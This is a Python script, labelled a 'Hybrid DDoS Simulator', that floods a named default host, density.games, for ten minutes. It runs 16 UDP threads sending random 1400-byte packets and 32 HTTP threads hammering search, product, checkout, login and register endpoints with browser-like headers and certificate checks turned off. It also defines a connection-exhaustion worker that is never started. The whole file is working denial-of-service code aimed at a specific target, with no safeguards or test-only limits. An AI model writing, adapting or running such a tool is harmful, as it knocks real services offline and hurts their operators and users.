import socket
import threading
import random
import sys
import time
import os
import platform
import requests
from concurrent.futures import ThreadPoolExecutor

# --- Configuration ---
TARGET_HOST = "density.games"
TARGET_PORT = 443
PROTOCOL = "HTTPS"
PAYLOAD_SIZE = 1400
NUM_UDP_THREADS = 16
NUM_HTTP_THREADS = 32
DURATION = 600 # 10 minutes

# --- Global State ---
stop_flag = threading.Event()
udp_packets_sent = 0
http_requests_sent = 0
lock = threading.Lock()

# --- UDP Flood Worker ---
def udp_flood_worker(worker_id, target_host, target_port):
    """
    High-throughput UDP flood.
    """
    global udp_packets_sent
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
    except:
        pass
        
    payloads = [random._urandom(PAYLOAD_SIZE) for _ in range(10)]
    payload_idx = 0
    
    print(f"[UDP Worker {worker_id}] Started")
    
    while not stop_flag.is_set():
        try:
            data = payloads[payload_idx]
            payload_idx = (payload_idx + 1) % len(payloads)
            sock.sendto(data, (target_host, target_port))
            with lock:
                udp_packets_sent += 1
        except (OSError, socket.error):
            continue
            
    sock.close()

# --- TCP SYN Flood Worker ---
def tcp_syn_flood_worker(worker_id, target_host, target_port):
    """
    Simulates a TCP SYN flood by opening connections and not completing the handshake.
    This exhausts the server's backlog queue.
    """
    global udp_packets_sent # Reusing counter for simplicity in stats
    
    print(f"[TCP Worker {worker_id}] Started")
    
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            # Connect to target
            # This sends a SYN packet. If the server is overwhelmed, this will fail or timeout.
            sock.connect((target_host, target_port))
            
            # Send a small payload to keep the connection alive briefly
            # This is a "Half-Open" connection if we don't complete the handshake properly,
            # but Python's connect() completes it. To do a true SYN flood, we need raw sockets.
            # For now, we'll do a "Connection Exhaustion" attack by opening many connections.
            
            # Keep connection open for a short time to hold resources
            time.sleep(0.5)
            
            with lock:
                udp_packets_sent += 1 # Count as a "packet" for stats
            
            sock.close()
        except (OSError, socket.error):
            continue

# --- HTTP Application Layer Flood Worker ---
def http_flood_worker(worker_id, target_host):
    """
    Sends complex HTTP requests to exhaust backend resources.
    Targets endpoints that might be expensive to process.
    """
    global http_requests_sent
    
    # Common endpoints that might be expensive
    endpoints = [
        "/api/search?q={}",
        "/api/products/{}",
        "/api/checkout/{}",
        "/login",
        "/register"
    ]
    
    # Random data to simulate real users
    random_words = ["gaming", "pc", "setup", "monitor", "keyboard", "mouse", "gpu", "cpu", "ram", "ssd", "laptop", "ultrawide", "mechanical", "ergonomic", "wireless", "gaming"]
    
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    })
    
    print(f"[HTTP Worker {worker_id}] Started")
    
    while not stop_flag.is_set():
        try:
            # Pick a random endpoint
            endpoint = random.choice(endpoints)
            
            # Generate a random query or ID
            if "{}" in endpoint:
                # Random ID or word
                if random.random() > 0.5:
                    param = str(random.randint(1, 10000))
                else:
                    param = random.choice(random_words)
                url = f"https://{target_host}{endpoint.format(param)}"
            else:
                url = f"https://{target_host}{endpoint}"
                
            # Add random query params to simulate search
            if "search" in url:
                url += f"&sort={random.choice(['price-asc', 'price-desc', 'rating', 'newest'])}"
                
            # Send request
            # timeout=5 to prevent hanging
            response = session.get(url, timeout=5, verify=False)
            
            with lock:
                http_requests_sent += 1
                
        except requests.exceptions.RequestException as e:
            # Ignore connection errors, timeouts, etc.
            continue

def monitor(target_host, duration):
    """
    Monitor thread to display stats and handle duration.
    """
    global udp_packets_sent, http_requests_sent
    
    start_time = time.time()
    last_stats_time = start_time
    last_udp = 0
    last_http = 0
    
    print(f"\n{'='*40}")
    print(f"Target: {target_host}")
    print(f"UDP Threads: {NUM_UDP_THREADS}")
    print(f"HTTP Threads: {NUM_HTTP_THREADS}")
    print(f"Duration: {duration}s (0=infinite)")
    print(f"{'='*40}\n")
    print("Press Ctrl+C to stop early.")
    
    try:
        while not stop_flag.is_set():
            time.sleep(1)
            
            if duration > 0 and (time.time() - start_time) >= duration:
                print("\n[!] Duration reached, stopping...")
                stop_flag.set()
                break
            
            with lock:
                current_udp = udp_packets_sent
                current_http = http_requests_sent
                
            # Calculate PPS
            udp_pps = (current_udp - last_udp) / (time.time() - last_stats_time)
            http_pps = (current_http - last_http) / (time.time() - last_stats_time)
            
            last_stats_time = time.time()
            last_udp = current_udp
            last_http = current_http
            
            print(f"\r[STATS] UDP: {current_udp:>10} ({udp_pps:>6.0f} pps) | HTTP: {current_http:>10} ({http_pps:>6.0f} req/s) | Time: {int(time.time() - start_time)}s", end="")
            
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        stop_flag.set()

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Hybrid DDoS Simulator")
    parser.add_argument("--host", default=TARGET_HOST, help="Target hostname")
    parser.add_argument("--port", type=int, default=TARGET_PORT, help="Target port")
    parser.add_argument("--udp-threads", type=int, default=NUM_UDP_THREADS, help="Number of UDP threads")
    parser.add_argument("--http-threads", type=int, default=NUM_HTTP_THREADS, help="Number of HTTP threads")
    parser.add_argument("--duration", type=int, default=DURATION, help="Duration in seconds (0 for infinite)")
    
    args = parser.parse_args()
    
    print(f"[*] Initializing Hybrid DDoS against {args.host}:{args.port}")
    
    # Resolve hostname
    try:
        resolved_ip = socket.gethostbyname(args.host)
        print(f"[*] Resolved {args.host} to {resolved_ip}")
        target_host = resolved_ip
    except Exception as e:
        print(f"[!] Failed to resolve host: {e}")
        return

    # Start monitor
    monitor_thread = threading.Thread(target=monitor, args=(args.host, args.duration))
    monitor_thread.start()
    
    # Start UDP Workers
    udp_workers = []
    for i in range(args.udp_threads):
        t = threading.Thread(target=udp_flood_worker, args=(i, target_host, args.port))
        t.start()
        udp_workers.append(t)
        time.sleep(0.01)
        
    # Start TCP/HTTP Workers
    # We'll use ThreadPoolExecutor for HTTP to manage sessions better
    # But for simplicity, we'll use threads again
    http_workers = []
    for i in range(args.http_threads):
        t = threading.Thread(target=http_flood_worker, args=(i, args.host))
        t.start()
        http_workers.append(t)
        time.sleep(0.01)
        
    # Wait for all workers
    for t in udp_workers + http_workers:
        t.join()
        
    print(f"\n[!] Attack finished.")
    print(f"[!] Total UDP Packets: {udp_packets_sent}")
    print(f"[!] Total HTTP Requests: {http_requests_sent}")

if __name__ == "__main__":
    main()
